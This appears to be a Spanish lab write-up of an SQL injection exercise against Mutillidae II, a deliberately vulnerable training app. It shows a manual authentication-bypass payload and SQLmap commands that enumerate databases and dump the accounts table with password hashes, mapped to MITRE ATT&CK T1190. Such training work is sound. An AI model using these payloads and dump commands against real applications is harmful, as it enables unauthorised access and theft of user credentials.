## Herramientas

- **Navegador / cURL** — para el payload manual inicial de confirmación.
- **SQLmap** — para la explotación automatizada y extracción de datos.

## Comandos y payloads ejecutados

### 1. Confirmación manual de la vulnerabilidad

Sobre el módulo de inyección basado en `page=user-info.php` (u otro módulo de nivel de seguridad bajo/medio de Mutillidae II), se prueba primero un payload de confirmación clásico en el parámetro vulnerable:

```
http://<IP_DEL_SERVIDOR>:8080/mutillidae/index.php?page=user-info.php&username=admin'--&password=
```

Una respuesta que evidencia bypass de autenticación o error de sintaxis SQL confirma que el parámetro no está sanitizado.

### 2. Explotación automatizada co n SQLmap

```bash
sqlmap -u "http://<IP_DEL_SERVIDOR>:8080/mutillidae/index.php?page=user-info.php&username=admin&password=test" --batch --dbs
```

- `--batch`: acepta los valores por defecto de SQLmap sin intervención manual, para automatizar el ejercicio.
- `--dbs`: enumera las bases de datos disponibles en el motor.

### 3. Extracción de datos de la base identificada

```bash
sqlmap -u "http://<IP_DEL_SERVIDOR>:8080/mutillidae/index.php?page=user-info.php&username=admin&password=test" --batch -D mutillidae -T accounts --dump
```

- `-D mutillidae -T accounts`: apunta a la tabla de cuentas de usuario de la propia base de Mutillidae II.
- `--dump`: extrae el contenido completo de la tabla (usuarios, hashes de contraseña, etc.).

## Resultado observado

- **Parámetro vulnerable confirmado:** el parámetro probado en el módulo de login/búsqueda de Mutillidae II no sanitiza la entrada, permitiendo alterar la lógica de la consulta SQL.
- **Datos extraídos:** listado de cuentas de usuario de la aplicación, incluyendo hashes de contraseña almacenados en la tabla `accounts` de la base `mutillidae`.
- **Impacto:** exposición de credenciales de la aplicación sin necesidad de autenticación previa — cumple el objetivo de Initial Access vía explotación de aplicación pública expuesta.

## Técnica MITRE ATT&CK asociada

- **Táctica:** Initial Access
- **Técnica:** Exploit Public-Facing Application — [T1190](https://attack.mitre.org/techniques/T1190/)
